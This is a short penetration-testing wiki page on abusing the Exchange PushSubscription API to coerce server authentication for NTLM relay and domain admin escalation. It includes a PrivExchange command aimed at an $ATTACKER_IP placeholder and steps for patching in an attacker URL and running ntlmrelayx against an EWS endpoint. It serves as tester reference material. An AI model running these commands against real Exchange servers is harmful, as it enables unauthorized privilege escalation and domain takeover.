# PushSubscription abuse

## Theory

"PushSubscription" is an API on Exchange Web Services that allows to subscribe to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. The coerced authentication is made over HTTP, which is particularly powerful when doing [NTLM relay](../ntlm/relay.md) ([because of the Session Signing and MIC mitigations](../ntlm/relay.md#mic-message-integrity-code)). As Exchange servers usually have high privileges in a domain (i.e. `WriteDacl`, see [Abusing ACLs](../dacl/)), the forced authentication can then be relayed and abused to obtain domain admin privileges (see [NTLM Relay](../ntlm/relay.md) and [Kerberos Unconstrained Delegations](../kerberos/delegations/#unconstrained-delegations-kud)).

## Practice

[PrivExchange](https://github.com/dirkjanm/privexchange/) (Python) is a tool able to log in on Exchange Web Services and call that API.

```bash
privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET
```

> [!TIP]
> In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) to make the API call.
> 
> The modified [httpattack.py](https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py) can be used with ntlmrelayx.py to perform this attack. The attacker host needs to be modified in the script since it is hard-coded.
> 
> ```bash
> cd /PATH/TO/impacket/impacket/examples/ntlmrelayx/attacks/httpattack.py
> mv httpattack.py httpattack.py.old
> wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py
> sed -i 's/attacker_url = .*$/attacker_url = "$ATTACKER_URL"/' httpattack.py
> cd /PATH/TO/impacket
> pip3 install .
> ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx
> ```

> [!NOTE]
> On February 12th 2019, Microsoft released updates for Exchange which resolved
> 
> * the coerced authentication issue
> * the fact that Exchange servers had overkill permissions leading attacker to a full domain compromission.
